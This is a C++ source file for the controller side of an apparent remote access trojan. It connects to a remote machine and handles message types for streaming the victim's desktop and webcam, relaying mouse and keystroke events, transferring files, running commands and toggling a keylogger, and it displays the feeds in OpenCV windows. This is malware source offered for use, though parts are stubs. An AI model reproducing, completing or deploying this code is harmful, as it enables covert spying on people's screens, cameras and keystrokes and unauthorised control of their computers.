// RatClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "../WinNetlib/NetworkHandlerClient.h"

#include <string>
#include <thread>

#include <opencv2/opencv.hpp>

using namespace std;

NetworkHandlerClient NH;
string DesktopFeed = "Desktop Feed";
string CamFeed = "Cam Feed";

void CallBackFunc(int event, int x, int y, int flags, void* userdata)
{
    if (event == cv::EVENT_LBUTTONDOWN)
    {
        cout << "Left button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
        NH.SendDataT<int>(x);
        NH.SendDataT<int>(y);
    }
    else if (event == cv::EVENT_RBUTTONDOWN)
    {
        cout << "Right button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
    }
    else if (event == cv::EVENT_MBUTTONDOWN)
    {
        cout << "Middle button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
    }
    else if (event == cv::EVENT_MOUSEMOVE)
    {
        //cout << "Mouse move over the window - position (" << x << ", " << y << ")" << endl;

    }
}

void rcv(NetworkHandlerClient NH) {
    DataType dt;
    cv::Mat image;
    INPUT in;

    NH.AddDataType("DesktopIMG", 2);
    NH.AddDataType("MousePos", 3);
    NH.AddDataType("MouseDown", 4);
    NH.AddDataType("MouseUp", 4);
    NH.AddDataType("KeyDown", 5);
    NH.AddDataType("KeyUp", 6);
    NH.AddDataType("CamIMG", 7);
    NH.AddDataType("SendFILE", 8);
    NH.AddDataType("RecvFILE", 8);
    NH.AddDataType("CMD", 9);
    NH.AddDataType("EnableLogger", 10);
    NH.AddDataType("DisableLogger", 11);
    //NH.AddDataType("", 3);

    NH.SendTypeList();

    while (true) {
        NH.RecvDataType(dt);
        if (dt.Name == "SendFILE") {
            std::string path = NH.RecvDataT<std::string>();
            NH.RecvFile(path);
        }
        else if (dt.Name == "DesktopIMG")
        {

            cv::resizeWindow(DesktopFeed, image.cols / 2, image.rows / 2);

            cv::setMouseCallback(DesktopFeed, CallBackFunc, NULL);
            NH.RecvCVMat(&image);


            cv::imshow(DesktopFeed, image); // Show our image inside the created window.

            if (cv::waitKey(10) == 27)
            {
                cout << "Esc key is pressed by user. Stoppig the video" << endl;
                cv::destroyWindow(DesktopFeed);
            }
        }
        else if (dt.Name == "CamIMG") {
            NH.RecvCVMat(&image);


            cv::imshow(CamFeed, image); // Show our image inside the created window.

            if (cv::waitKey(10) == 27)
            {
                cout << "Esc key is pressed by user. Stoppig the video" << endl;
                cv::destroyWindow(CamFeed);
            }
        }
        else if (dt.Name == "PopUp") {
            printf("invalid packet type");
        }
        else if (dt.Name == "PopUpYN") {
            printf("invalid packet type");
        }
        else if (dt.Name == "Invalid") {
            printf("invalid packet type");
        }
        else {
            printf("invalid packet type");
        }

    }
}

int main()
{
    thread recvThread;

    string input = "";
    string ip="None";
    string port= "None";
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    while (true)
    {
        SetConsoleTextAttribute(hConsole, 12);
        cout << "IP: ";
        SetConsoleTextAttribute(hConsole, 7);
        cout << ip;
        SetConsoleTextAttribute(hConsole, 12);
        cout << " Port: ";
        SetConsoleTextAttribute(hConsole, 7);
        cout << port << endl;
        SetConsoleTextAttribute(hConsole, 10);
        cout << "enter command: ";
        SetConsoleTextAttribute(hConsole, 7);
        getline(cin, input);
        if (input == "Connect") {  
            SetConsoleTextAttribute(hConsole, 12);
            cout << "Enter IP Adress: ";
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, ip);
            SetConsoleTextAttribute(hConsole, 12);
            cout << "Enter Port: ";
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, port);
            NH.DisConnect();
            system("cls");
            if (NH.Init((PCSTR)ip.c_str(), (PCSTR)port.c_str())) {
                if (!NH.Connect()) {
                    ip = "None";
                    port = "None"; 
                    SetConsoleTextAttribute(hConsole, 13);
                    printf("failed to connect!\n");
                    NH.DisConnect();
                }
            }
            else {
                ip = "None";
                port = "None";
                SetConsoleTextAttribute(hConsole, 13);
                printf("failed to connect!\n");
                NH.DisConnect();
            }
        }
        if (input == "DefaultConnect") {
            NH.DisConnect();
            system("cls");
            if (NH.DefaultInitConnect()) {
                ip = NH.getIP();
                port = NH.getPort();
            }
            else {
                ip = "None";
                port = "None";
                SetConsoleTextAttribute(hConsole, 13);
                printf("failed to connect!\n");
                NH.DisConnect();
            }
            continue;
        }
        else if (input == "Disconnect") {
            ip = "None";
            port = "None";
            NH.DisConnect();
        }
        else if (input == "Help") {
            SetConsoleTextAttribute(hConsole, 11);
            printf("Commands are: ");
            continue;
        }
        else if (input == "Message") {
            SetConsoleTextAttribute(hConsole, 10);
            printf("Enter message: ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, input);
            NH.SendDataT<string>(input);
        }
        else if (input == "") {
            
        }
        else {
            cout << "Invalid Command!" << endl;
            continue;
        }
        system("cls");
    }
    system("pause");
    return 0;
}